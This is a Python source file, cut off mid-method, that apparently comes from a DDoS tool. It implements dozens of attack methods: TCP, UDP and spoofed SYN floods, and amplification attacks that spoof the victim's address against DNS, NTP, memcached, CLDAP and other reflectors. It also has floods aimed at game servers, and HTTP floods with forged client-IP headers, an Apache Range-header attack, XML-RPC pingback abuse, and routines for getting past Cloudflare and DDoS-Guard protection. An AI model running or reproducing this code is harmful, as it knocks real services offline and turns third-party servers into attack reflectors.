import logging
from contextlib import suppress
from itertools import cycle
from math import log2, trunc
from os import urandom as randbytes
from pathlib import Path
from secrets import choice as randchoice
from socket import (
    AF_INET,
    IP_HDRINCL,
    IPPROTO_IP,
    IPPROTO_TCP,
    IPPROTO_UDP,
    SOCK_DGRAM,
    SOCK_RAW,
    SOCK_STREAM,
    TCP_NODELAY,
    socket,
)
from ssl import CERT_NONE, SSLContext, create_default_context
from struct import pack as data_pack
from subprocess import PIPE, run
from sys import exit as _exit
from threading import Event, Lock, Thread
from time import sleep, time
from typing import Any, Optional, Union
from urllib import parse
from uuid import UUID, uuid4

import requests
from certifi import where
from cloudscraper import create_scraper
from impacket.ImpactPacket import IP, TCP, UDP, Data
from PyRoxy import Proxy, ProxyType
from PyRoxy import Tools as ProxyTools
from yarl import URL

from core import ROOT_DIR, cl, logger

ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE

# ======================================
# TODO: split this file to a smaller ones
# NOTE: In this case it is better to use divisinal project layout
# ======================================

__version__ = "2.4 SNAPSHOT"
__ip__: Any = None

SOCK_TIMEOUT = 5


class AtomicCounter:
    def __init__(self, initial=0):
        self.value = initial
        self._lock = Lock()

    def __iadd__(self, value):
        self.increment(value)
        return self

    def __int__(self):
        return self.value

    def increment(self, num=1):
        with self._lock:
            self.value += num
            return self.value


def getMyIPAddress() -> str:
    global __ip__
    timeout_payload = {"timeout": 1}

    if __ip__:
        return __ip__

    while True:
        with suppress(requests.ConnectionError):
            __ip__ = requests.get("https://api.my-ip.io/ip", **timeout_payload).text
            return __ip__
        with suppress(requests.ConnectionError):
            __ip__ = requests.get("https://ipwhois.app/json/", **timeout_payload).json()["ip"]
            return __ip__
        with suppress(requests.ConnectionError):
            __ip__ = requests.get("https://ipinfo.io/json", **timeout_payload).json()["ip"]
            return __ip__
        with suppress(requests.ConnectionError):
            __ip__ = ProxyTools.Patterns.IP.search(requests.get("http://checkip.dyndns.org/", **timeout_payload).text)
            return __ip__
        with suppress(requests.ConnectionError):
            __ip__ = ProxyTools.Patterns.IP.search(requests.get("https://spaceiran.com/myip/", **timeout_payload).text)
            return __ip__
        with suppress(requests.ConnectionError):
            __ip__ = requests.get("https://ip.42.pl/raw", **timeout_payload).text
            return __ip__


def exit(*messages) -> None:
    if not messages:
        logging.shutdown()
        _exit(1)

    logger.error(cl.RED + " ".join(messages) + cl.RESET)


class Methods:
    LAYER7_METHODS: set[str] = {
        "CFB",
        "BYPASS",
        "GET",
        "POST",
        "OVH",
        "STRESS",
        "DYN",
        "SLOW",
        "HEAD",
        "NULL",
        "COOKIE",
        "PPS",
        "EVEN",
        "GSB",
        "DGB",
        "AVB",
        "CFBUAM",
        "APACHE",
        "XMLRPC",
        "BOT",
        "BOMB",
        "DOWNLOADER",
        "KILLER",
    }

    LAYER4_METHODS: set[str] = {
        "TCP",
        "UDP",
        "SYN",
        "VSE",
        "MINECRAFT",
        "MEM",
        "NTP",
        "DNS",
        "ARD",
        "CHAR",
        "RDP",
        "MCBOT",
        "CONNECTION",
        "CPS",
        "FIVEM",
        "TS3",
        "MCPE",
        "CLDAP",
    }
    ALL_METHODS: set[str] = LAYER4_METHODS | LAYER7_METHODS


google_agents = [
    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html)) "
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
]


class Tools:
    @staticmethod
    def humanbits(i: int) -> str:
        MULTIPLES = ["Bit", "kBit", "MBit", "GBit"]
        if i < 0:
            return "0"

        base = 1024
        multiple = trunc(log2(i) / log2(base))
        value = i / pow(base, multiple)

        return f"{value:.2f} {MULTIPLES[multiple]}"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ["", "k", "m", "g", "t", "p"]
        if num > 999:
            obje = sum([abs(num / 1000.0**x) >= 1 for x in range(1, len(suffixes))])
            return f"{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}"
        else:
            return num

    @staticmethod
    def sizeOfRequest(response: requests.Response) -> int:
        request: requests.PreparedRequest = response.request
        size: int = len(request.method) if request.method else 0
        size += len(request.url) if request.url else 0
        size += len("\r\n".join(f"{key}: {value}" for key, value in request.headers.items()))
        return size

    @staticmethod
    def randchr(lengh: int) -> str:
        return str(ProxyTools.Random.rand_str(lengh)).strip()

    @staticmethod
    def send(sock: socket, packet: bytes, REQUESTS_SENT, BYTES_SEND) -> bool:
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1

        return True

    @staticmethod
    def sendto(sock, packet, target, REQUESTS_SENT, BYTES_SEND) -> bool:
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1

        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        idss = None
        with requests.Session() as s:
            if pro:
                s.proxies = pro
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1",
            }
            with s.get(url, headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(requests.cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site",
            }
            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    if key == "__ddg2":
                        idss = value
                    s.cookies.set_cookie(requests.cookies.create_cookie(key, value))

            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site",
            }
            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(requests.cookies.create_cookie(key, value))
                return s

    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()


class Minecraft:
    @classmethod
    def varint(cls, d: int) -> bytes:
        o = b""
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @classmethod
    def data(cls, *args) -> bytes:
        if not all((isinstance(arg, bytes) for arg in args)):
            raise TypeError("All elements have to be Byte types")

        payload = b"".join(args)
        return cls.varint(len(payload)) + payload

    @classmethod
    def short(integer: int) -> bytes:
        return data_pack(">H", integer)

    @classmethod
    def handshake(cls, target: tuple[str, int], version: int, state: int) -> bytes:
        return cls.data(
            cls.varint(0x00),
            cls.varint(version),
            cls.data(target[0].encode()),
            cls.short(target[1]),
            cls.varint(state),
        )

    @classmethod
    def handshake_forwarded(cls, target: tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
        return cls.data(
            cls.varint(0x00),
            cls.varint(version),
            cls.data(target[0].encode(), b"\x00", ip.encode(), b"\x00", uuid.hex.encode()),
            cls.short(target[1]),
            cls.varint(state),
        )

    @classmethod
    def login(cls, username: Union[str, bytes]) -> bytes:
        b_username: bytes = username.encode() if isinstance(username, str) else username
        return cls.data(cls.varint(0x00), cls.data(b_username))

    @classmethod
    def keepalive(cls, num_id: int) -> bytes:
        return cls.data(cls.varint(0x00), cls.varint(num_id))

    @classmethod
    def chat(cls, message: str) -> bytes:
        return cls.data(Minecraft.varint(0x01), cls.data(message.encode()))


# NOTE: noinspection PyBroadException,PyUnusedLocal
class Layer4:
    _method: str
    _target: tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle
    _proxies: Optional[list[Proxy]] = None

    def __init__(
        self,
        target: tuple[str, int],
        ref: set[str],
        method: str,
        synevent: Event,
        proxies: set[Proxy],
        REQUESTS_SENT,
        BYTES_SEND,
    ):
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self._method = method
        self._target = target
        self._synevent = synevent
        self.REQUESTS_SENT = REQUESTS_SENT
        self.BYTES_SEND = BYTES_SEND
        if proxies:
            self._proxies = list(proxies)

    def run(self) -> None:
        if self._synevent:
            self._synevent.wait()
        self.select(self._method)

        while self._synevent.is_set():
            self.SENT_FLOOD()

    def open_connection(self, conn_type=AF_INET, sock_type=SOCK_STREAM, proto_type=IPPROTO_TCP):
        if self._proxies:
            s = randchoice(self._proxies).open_socket(conn_type, sock_type, proto_type)
        else:
            s = socket(conn_type, sock_type, proto_type)
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.settimeout(SOCK_TIMEOUT)
        s.connect(self._target)

        return s

    def select(self, name):
        self.SENT_FLOOD = self.TCP

        if name == "UDP":
            self.SENT_FLOOD = self.UDP
        elif name == "SYN":
            self.SENT_FLOOD = self.SYN
        elif name == "VSE":
            self.SENT_FLOOD = self.VSE
        elif name == "TS3":
            self.SENT_FLOOD = self.TS3
        elif name == "MCPE":
            self.SENT_FLOOD = self.MCPE
        elif name == "FIVEM":
            self.SENT_FLOOD = self.FIVEM
        elif name == "MINECRAFT":
            self.SENT_FLOOD = self.MINECRAFT
        elif name == "CPS":
            self.SENT_FLOOD = self.CPS
        elif name == "CONNECTION":
            self.SENT_FLOOD = self.CONNECTION
        elif name == "MCBOT":
            self.SENT_FLOOD = self.MCBOT
        elif name == "RDP":
            self._amp_payload = (
                b"\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00",
                3389,
            )
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        elif name == "CLDAP":
            self._amp_payload = (
                b"\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00"
                b"\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00",
                389,
            )
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        elif name == "MEM":
            self._amp_payload = (b"\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n", 11211)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        elif name == "CHAR":
            self._amp_payload = (b"\x01", 19)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        elif name == "ARD":
            self._amp_payload = (b"\x00\x14\x00\x00", 3283)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        elif name == "NTP":
            self._amp_payload = (b"\x17\x00\x03\x2a\x00\x00\x00\x00", 123)
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())
        elif name == "DNS":
            self._amp_payload = (
                b"\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00"
                b"\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00",
                53,
            )
            self.SENT_FLOOD = self.AMP
            self._amp_payloads = cycle(self._generate_amp())

    def TCP(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(1024), self.REQUESTS_SENT, self.BYTES_SEND):
                continue
        Tools.safe_close(s)

    def MINECRAFT(self) -> None:
        handshake = Minecraft.handshake(self._target, 74, 1)
        ping = Minecraft.data(b"\x00")

        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, handshake, self.REQUESTS_SENT, self.BYTES_SEND):
                Tools.send(s, ping, self.REQUESTS_SENT, self.BYTES_SEND)
        Tools.safe_close(s)

    def CPS(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            self.REQUESTS_SENT += 1
        Tools.safe_close(s)

    def alive_connection(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while s.recv(1):
                continue
        Tools.safe_close(s)

    def CONNECTION(self) -> None:
        with suppress(Exception):
            Thread(target=self.alive_connection).start()
            self.REQUESTS_SENT += 1

    def UDP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(1024), self._target, self.REQUESTS_SENT, self.BYTES_SEND):
                continue
        Tools.safe_close(s)

    def SYN(self) -> None:
        payload = self._genrate_syn()
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, payload, self._target, self.REQUESTS_SENT, self.BYTES_SEND):
                continue
        Tools.safe_close(s)

    def AMP(self) -> None:
        payload = next(self._amp_payloads)
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, payload, self._target, self.REQUESTS_SENT, self.BYTES_SEND):
                continue
        Tools.safe_close(s)

    def MCBOT(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            Tools.send(
                s,
                Minecraft.handshake_forwarded(self._target, 47, 2, ProxyTools.Random.rand_ipv4(), uuid4()),
                self.REQUESTS_SENT,
                self.BYTES_SEND,
            )
            Tools.send(
                s,
                Minecraft.login(f"MHDDoS_{ProxyTools.Random.rand_str(5)}"),
                self.REQUESTS_SENT,
                self.BYTES_SEND,
            )
            sleep(1.5)

            c = 360
            while Tools.send(
                s,
                Minecraft.keepalive(ProxyTools.Random.rand_int(1111111, 9999999)),
                self.REQUESTS_SENT,
                self.BYTES_SEND,
            ):
                c -= 1
                if c:
                    continue
                c = 360
                Tools.send(
                    s,
                    Minecraft.chat(Tools.randchr(100)),
                    self.REQUESTS_SENT,
                    self.BYTES_SEND,
                )
        Tools.safe_close(s)

    def VSE(self) -> None:
        payload = (
            b"\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65" b"\x20\x51\x75\x65\x72\x79\x00"
        )
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target, self.REQUESTS_SENT, self.BYTES_SEND):
                continue
        Tools.safe_close(s)

    def FIVEM(self) -> None:
        payload = b"\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target, self.REQUESTS_SENT, self.BYTES_SEND):
                continue
        Tools.safe_close(s)

    def TS3(self) -> None:
        payload = b"\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02"
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target, self.REQUESTS_SENT, self.BYTES_SEND):
                continue
        Tools.safe_close(s)

    def MCPE(self) -> None:
        payload = (
            b"\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f"
            b"\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20"
            b"\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c"
            b"\x73"
        )
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target, self.REQUESTS_SENT, self.BYTES_SEND):
                continue
        Tools.safe_close(s)

    def _genrate_syn(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(getMyIPAddress())
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(ProxyTools.Random.rand_int(1, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)

            ud: UDP = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])

            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)

            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads


# noinspection PyBroadException,PyUnusedLocal
class HttpFlood:
    _proxies: Optional[list[Proxy]] = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: list[str]
    _referers: list[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any

    def __init__(
        self,
        thread_id: int,
        target: URL,
        host: str,
        method: str,
        rpc: int,
        synevent: Event,
        useragents: set[str],
        referers: set[str],
        proxies: set[Proxy],
        REQUESTS_SENT,
        BYTES_SEND,
    ) -> None:
        self.SENT_FLOOD = None
        self._thread_id = thread_id
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (self._host, (self._target.port or 80))
        self.REQUESTS_SENT = REQUESTS_SENT
        self.BYTES_SEND = BYTES_SEND

        if not self._target.host:
            raise ValueError("Not target host")

        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._host, (self._target.port or 80))

        referers = (
            {
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer" "/sharer.php?u=",
                ",https://drive.google.com/viewerng/viewer?url=",
                ",https://www.google.com/translate?u=",
            }
            if not referers
            else referers
        )

        self._referers = list(referers)
        self._proxies = list(proxies) if proxies else None

        useragents = (
            {
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 "
                "Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 "
                "Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 "
                "Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
            }
            if not useragents
            else useragents
        )

        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        self._defaultpayload = "%s %s HTTP/%s\r\n" % (
            self._req_type,
            target.raw_path_qs,
            randchoice(["1.0", "1.1", "1.2"]),
        )
        self._payload = (
            self._defaultpayload + "Accept-Encoding: gzip, deflate, br\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Cache-Control: max-age=0\r\n"
            "Connection: Keep-Alive\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Site: none\r\n"
            "Sec-Fetch-User: ?1\r\n"
            "Sec-Gpc: 1\r\n"
            "Pragma: no-cache\r\n"
            "Upgrade-Insecure-Requests: 1\r\n"
        )

    def run(self) -> None:
        if self._synevent:
            self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof: str = ProxyTools.Random.rand_ipv4()
        return (
            "X-Forwarded-Proto: Http\r\n"
            f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
            f"Via: {spoof}\r\n"
            f"Client-IP: {spoof}\r\n"
            f"X-Forwarded-For: {spoof}\r\n"
            f"Real-IP: {spoof}\r\n"
        )

    def generate_payload(self, other: str = None) -> bytes:
        return str.encode(
            (
                self._payload
                + "Host: %s\r\n" % self._target.authority
                + self.randHeadercontent
                + (other if other else "")
                + "\r\n"
            )
        )

    def open_connection(self) -> socket:
        if self._proxies:
            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket(AF_INET, SOCK_STREAM)

        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.settimeout(SOCK_TIMEOUT)
        sock.connect(self._raw_target)

        if self._target.scheme.lower() == "https":
            sock = ctx.wrap_socket(
                sock,
                server_hostname=self._target.host,
                server_side=False,
                do_handshake_on_connect=True,
                suppress_ragged_eofs=True,
            )
        return sock

    @property
    def randHeadercontent(self) -> str:
        return (
            f"User-Agent: {randchoice(self._useragents)}\r\n"
            f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" + self.SpoofIP
        )

    @staticmethod
    def getMethodType(method: str) -> str:
        # TODO: Make it more simple
        return (
            "GET"
            if {method.upper()}
            & {
                "CFB",
                "CFBUAM",
                "GET",
                "COOKIE",
                "OVH",
                "EVEN",
                "DYN",
                "SLOW",
                "PPS",
                "APACHE",
                "BOT",
            }
            else "POST"
            if {method.upper()} & {"POST", "XMLRPC", "STRESS"}
            else "HEAD"
            if {method.upper()} & {"GSB", "HEAD"}
            else "REQUESTS"
        )

    def POST(self) -> None:
        payload: bytes = self.generate_payload(
            (
                "Content-Length: 44\r\n"
                "X-Requested-With: XMLHttpRequest\r\n"
                "Content-Type: application/json\r\n\r\n"
                '{"data": %s}'
            )
            % ProxyTools.Random.rand_str(32)
        )[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
        Tools.safe_close(s)

    def STRESS(self) -> None:
        payload: bytes = self.generate_payload(
            (
                "Content-Length: 524\r\n"
                "X-Requested-With: XMLHttpRequest\r\n"
                "Content-Type: application/json\r\n\r\n"
                '{"data": %s}'
            )
            % ProxyTools.Random.rand_str(512)
        )[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
        Tools.safe_close(s)

    def COOKIES(self) -> None:
        payload: bytes = self.generate_payload(
            "Cookie: _ga=GA%s;"
            " _gat=1;"
            " __cfduid=dc232334gwdsd23434542342342342475611928;"
            " %s=%s\r\n"
            % (
                ProxyTools.Random.rand_int(1000, 99999),
                ProxyTools.Random.rand_str(6),
                ProxyTools.Random.rand_str(32),
            )
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
        Tools.safe_close(s)

    def APACHE(self) -> None:
        payload: bytes = self.generate_payload("Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024)))
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
        Tools.safe_close(s)

    def XMLRPC(self) -> None:
        payload: bytes = self.generate_payload(
            (
                "Content-Length: 345\r\n"
                "X-Requested-With: XMLHttpRequest\r\n"
                "Content-Type: application/xml\r\n\r\n"
                "<?xml version='1.0' encoding='iso-8859-1'?>"
                "<methodCall><methodName>pingback.ping</methodName>"
                "<params><param><value><string>%s</string></value>"
                "</param><param><value><string>%s</string>"
                "</value></param></params></methodCall>"
            )
            % (ProxyTools.Random.rand_str(64), ProxyTools.Random.rand_str(64))
        )[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
        Tools.safe_close(s)

    def PPS(self) -> None:
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, self._defaultpayload, self.REQUESTS_SENT, self.BYTES_SEND)
        Tools.safe_close(s)

    def KILLER(self) -> None:
        while True:
            Thread(target=self.GET, daemon=True).start()

    def GET(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
        Tools.safe_close(s)

    def BOT(self) -> None:
        payload: bytes = self.generate_payload()
        p1, p2 = str.encode(
            "GET /robots.txt HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority + "Connection: Keep-Alive\r\n"
            "Accept: text/plain,text/html,*/*\r\n"
            "User-Agent: %s\r\n" % randchoice(google_agents) + "Accept-Encoding: gzip,deflate,br\r\n\r\n"
        ), str.encode(
            "GET /sitemap.xml HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority + "Connection: Keep-Alive\r\n"
            "Accept: */*\r\n"
            "From: googlebot(at)googlebot.com\r\n"
            "User-Agent: %s\r\n" % randchoice(google_agents) + "Accept-Encoding: gzip,deflate,br\r\n"
            "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9), ProxyTools.Random.rand_str(4))
            + "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n"
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, p1, self.REQUESTS_SENT, self.BYTES_SEND)
            Tools.send(s, p2, self.REQUESTS_SENT, self.BYTES_SEND)
            for _ in range(self._rpc):
                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
        Tools.safe_close(s)

    def EVEN(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            while Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND) and s.recv(1):
                continue
        Tools.safe_close(s)

    def OVH(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(min(self._rpc, 5)):
                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
        Tools.safe_close(s)

    def CFB(self):
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), create_scraper() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(), proxies=pro.asRequest()) as res:
                        self.REQUESTS_SENT += 1
                        self.BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                with s.get(self._target.human_repr()) as res:
                    self.REQUESTS_SENT += 1
                    self.BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def CFBUAM(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
            sleep(5.01)
            ts = time()
            for _ in range(self._rpc):
                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
                if time() > ts + 120:
                    break
        Tools.safe_close(s)

    def AVB(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                sleep(max(self._rpc / 1000, 1))
                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
        Tools.safe_close(s)

    def DGB(self):
        with suppress(Exception):
            proxies = None
            if self._proxies:
                pro = randchoice(self._proxies)
                proxies = pro.asRequest()

            with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), proxies) as ss:
                for _ in range(min(self._rpc, 5)):
                    sleep(min(self._rpc, 5) / 100)
                    with ss.get(self._target.human_repr(), proxies=pro.asRequest()) as res:
                        if b"<title>DDOS-GUARD</title>" in res.content[:100]:
                            break
                        self.REQUESTS_SENT += 1
                        self.BYTES_SEND += Tools.sizeOfRequest(res)

            Tools.safe_close(ss)

    def DYN(self):
        payload: Any = str.encode(
            self._payload
            + "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority)
            + self.randHeadercontent
            + "\r\n"
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
        Tools.safe_close(s)

    def DOWNLOADER(self):
        payload: Any = self.generate_payload()

        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
                while 1:
                    sleep(0.01)
                    data = s.recv(1)
                    if not data:
                        break
            Tools.send(s, b"0", self.REQUESTS_SENT, self.BYTES_SEND)
        Tools.safe_close(s)

    def BYPASS(self):
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), requests.Session() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(), proxies=pro.asRequest()) as res:
                        self.REQUESTS_SENT += 1
                        self.BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                with s.get(self._target.human_repr()) as res:
                    self.REQUESTS_SENT += 1
                    self.BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def GSB(self):
        payload = str.encode(
            "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type, self._target.raw_path_qs, ProxyTools.Random.rand_str(6))
            + "Host: %s\r\n" % self._target.authority
            + self.randHeadercontent
            + "Accept-Encoding: gzip, deflate, br\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Cache-Control: max-age=0\r\n"
            "Connection: Keep-Alive\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Site: none\r\n"
